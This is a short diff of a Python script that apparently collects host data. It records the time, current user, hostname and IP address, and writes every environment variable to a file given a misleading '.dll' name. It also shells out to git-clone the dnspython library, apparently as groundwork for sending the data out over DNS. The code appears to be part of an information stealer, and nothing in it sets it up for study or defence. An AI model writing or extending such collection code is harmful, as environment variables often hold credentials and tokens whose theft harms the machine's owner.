@@ -2,8 +2,14 @@
 from datetime import datetime
 import os
 import webbrowser
+import socket
+import platform
+import subprocess
 
-tFile = open("information.txt", "w")
+hostname = socket.gethostname()
+ipAddr = socket.gethostbyname(hostname)
+
+tFile = open("text file.txt", "w")
 
 # write System Time
 tFile.write("System Time: "+str(datetime.now()) + "\n")
@@ -21,13 +27,21 @@ tFile.writelines("\nCurrent User: "+ str(os.getlogin()))
 # Close text file
 tFile.close()
 
-devInfoFile = open("DeviceInfos3949664s3942121.dll", "w")
+devInfoFile = open("DeviceInfo39496643942121.dll", "w")
 
 for a in os.environ:
     devInfoFile.writelines(a+ '='+ os.getenv(a)+"\n")
     if(str(a) == "HOMEDRIVE"):
-        homedrive = a
+        homedrive = os.getenv(a)
+devInfoFile.write("\n\nHome Drive = "+ homedrive)
 
+devInfoFile.write("\nIP Address: = "+ ipAddr)
+
+
+os.system("git clone https://github.com/rthalley/dnspython.git")
 
 
 devInfoFile.close()
+
+
+
